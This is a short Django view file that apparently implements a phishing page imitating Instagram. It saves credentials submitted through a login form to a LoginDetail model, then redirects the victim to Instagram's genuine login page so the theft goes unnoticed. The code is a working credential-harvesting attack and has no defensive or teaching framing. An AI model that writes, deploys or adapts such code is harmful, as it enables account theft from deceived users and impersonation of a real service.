from django.shortcuts import render, redirect
from .forms import LoginForm
from .models import LoginDetail
# Create your views here.

def Login(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            form.save()
        return redirect('https://www.instagram.com/accounts/login/')
    else:
        form = LoginForm()
    return render(request, 'index.html', {'form': form})